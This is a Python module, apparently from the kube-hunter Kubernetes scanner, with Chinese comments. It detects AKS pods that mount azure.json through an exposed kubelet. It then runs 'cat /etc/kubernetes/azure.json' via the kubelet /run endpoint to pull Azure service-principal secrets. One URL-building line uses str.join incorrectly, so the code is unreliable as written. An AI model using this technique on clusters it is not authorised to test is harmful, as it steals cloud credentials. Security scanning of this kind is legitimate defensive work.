# `kubehunter\kube_hunter\modules\hunting\aks.py`

```py
# 导入所需的模块
import json
import logging
import requests

# 从 kube_hunter.conf 模块中导入 config 变量
from kube_hunter.conf import config
# 从 kube_hunter.modules.hunting.kubelet 模块中导入 ExposedRunHandler 类
from kube_hunter.modules.hunting.kubelet import ExposedRunHandler
# 从 kube_hunter.core.events 模块中导入 handler 函数
from kube_hunter.core.events import handler
# 从 kube_hunter.core.events.types 模块中导入 Event, Vulnerability 类
from kube_hunter.core.events.types import Event, Vulnerability
# 从 kube_hunter.core.types 模块中导入 Hunter, ActiveHunter, IdentityTheft, Azure 类
from kube_hunter.core.types import Hunter, ActiveHunter, IdentityTheft, Azure

# 获取 logger 对象
logger = logging.getLogger(__name__)

# 定义 AzureSpnExposure 类，继承自 Vulnerability 和 Event 类
class AzureSpnExposure(Vulnerability, Event):
    """The SPN is exposed, potentially allowing an attacker to gain access to the Azure subscription"""

    # 初始化方法
    def __init__(self, container):
        # 调用父类的初始化方法
        Vulnerability.__init__(
            self, Azure, "Azure SPN Exposure", category=IdentityTheft, vid="KHV004",
        )
        # 设置 container 属性
        self.container = container

# 使用 handler.subscribe 装饰器注册 ExposedRunHandler 类的事件处理函数
@handler.subscribe(ExposedRunHandler, predicate=lambda x: x.cloud == "Azure")
# 定义 AzureSpnHunter 类，继承自 Hunter 类
class AzureSpnHunter(Hunter):
    """AKS Hunting
    Hunting Azure cluster deployments using specific known configurations
    """

    # 初始化方法
    def __init__(self, event):
        # 设置 event 属性
        self.event = event
        # 构建 base_url 属性
        self.base_url = f"https://{self.event.host}:{self.event.port}"

    # 获取具有访问 azure.json 文件权限的容器
    # 获取密钥容器的方法
    def get_key_container(self):
        # 设置请求的终端点
        endpoint = f"{self.base_url}/pods"
        # 记录调试信息
        logger.debug("Trying to find container with access to azure.json file")
        try:
            # 发送 GET 请求获取数据，关闭 SSL 验证，设置超时时间
            r = requests.get(endpoint, verify=False, timeout=config.network_timeout)
        except requests.Timeout:
            # 如果请求超时，则记录调试信息
            logger.debug("failed getting pod info")
        else:
            # 解析返回的 JSON 数据，获取 pods 数据
            pods_data = r.json().get("items", [])
            # 遍历 pods 数据
            for pod_data in pods_data:
                # 遍历容器
                for container in pod_data["spec"]["containers"]:
                    # 遍历容器的挂载点
                    for mount in container["volumeMounts"]:
                        # 获取挂载路径
                        path = mount["mountPath"]
                        # 如果挂载路径符合条件
                        if "/etc/kubernetes/azure.json".startswith(path):
                            # 返回包含容器名称、pod 名称和命名空间的字典
                            return {
                                "name": container["name"],
                                "pod": pod_data["metadata"]["name"],
                                "namespace": pod_data["metadata"]["namespace"],
                            }

    # 执行方法
    def execute(self):
        # 调用获取密钥容器的方法
        container = self.get_key_container()
        # 如果获取到容器信息
        if container:
            # 发布 AzureSpnExposure 事件，传入容器信息
            self.publish_event(AzureSpnExposure(container=container))
# 订阅 AzureSpnExposure 事件，并定义 ProveAzureSpnExposure 类作为其处理程序
@handler.subscribe(AzureSpnExposure)
class ProveAzureSpnExposure(ActiveHunter):
    """Azure SPN Hunter
    Gets the azure subscription file on the host by executing inside a container
    """

    # 初始化方法，接收事件对象作为参数
    def __init__(self, event):
        self.event = event
        # 构建基础 URL
        self.base_url = f"https://{self.event.host}:{self.event.port}"

    # 执行方法，接收命令和容器作为参数
    def run(self, command, container):
        # 构建运行命令的 URL
        run_url = "/".join(self.base_url, "run", container["namespace"], container["pod"], container["name"])
        # 发送 POST 请求执行命令，并设置超时时间
        return requests.post(run_url, verify=False, params={"cmd": command}, timeout=config.network_timeout)

    # 执行方法，用于执行特定操作
    def execute(self):
        try:
            # 在容器中运行命令获取 Azure 订阅信息，并解析为 JSON 格式
            subscription = self.run("cat /etc/kubernetes/azure.json", container=self.event.container).json()
        except requests.Timeout:
            # 处理请求超时异常
            logger.debug("failed to run command in container", exc_info=True)
        except json.decoder.JSONDecodeError:
            # 处理 JSON 解析异常
            logger.warning("failed to parse SPN")
        else:
            # 如果成功获取到订阅信息，则更新事件对象的相关属性
            if "subscriptionId" in subscription:
                self.event.subscriptionId = subscription["subscriptionId"]
                self.event.aadClientId = subscription["aadClientId"]
                self.event.aadClientSecret = subscription["aadClientSecret"]
                self.event.tenantId = subscription["tenantId"]
                self.event.evidence = f"subscription: {self.event.subscriptionId}"
```